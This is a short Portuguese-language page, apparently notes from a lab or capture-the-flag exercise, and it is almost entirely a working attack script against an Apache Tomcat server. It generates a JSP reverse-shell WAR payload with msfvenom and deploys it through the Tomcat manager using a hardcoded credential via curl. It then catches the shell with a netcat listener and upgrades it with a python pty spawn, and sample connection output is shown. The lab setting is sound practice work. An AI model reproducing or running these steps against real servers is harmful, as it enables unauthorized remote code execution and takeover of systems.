---
title: "sh_MSFvenom"
date: 2020-07-22T23:25:57-03:00
draft: false
---

```sh
echo "-------------------------------------CRIANDO UM EXPLOID COM MSFVENOM----------------------------------------------------"




msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.29 LPORT=4444 -f war > exploit.war

#IP do seu local host + porta
#Criação do arquivo .WAR



echo "-------------------------------------UPLOAD DO EXPLOIT NO ALVO---------------------------------------------------------"







curl --user 'tomcat:$3cureP4s5w0rd123!' --upload-file exploit.war "http://10.10.10.194:8080/manager/text/deploy?path=/exploit.war"


#O ataque foi em um alvo cujo tomcat9 estava vulneravel

#IP do RHOST(alvo) + porta da aplicação

#upload do arquivo .war





echo "------------------------------------sucesso no upload -----------------------------------------------------"








echo "-----------------------------------Se conectando ao netcat---------------------------------------------------------"









echo "----------------------------------- http://10.10.10.194:8080/exploit.war  ---------------------------------------------"
nc -nvlp 4444

#em outra aba do terminal, deixe escutando na porta que desejar 
# nc -nvlp 4444


```

Quando estiver ouvindo a porta,  vá no navegador e chame o arquivo que você acabou de fazer o upload

`http://10.10.10.194:8080/exploit.war/`

volte no terminal, ele vai ter conectado via shell agora execute o shell reverso em python para o term

listening on [any] 4444 ...
connect to [10.10.14.29] from (UNKNOWN) [10.10.10.194] 50476

`$ python3 -c "import pty;pty.spawn('/bin/bash')"`
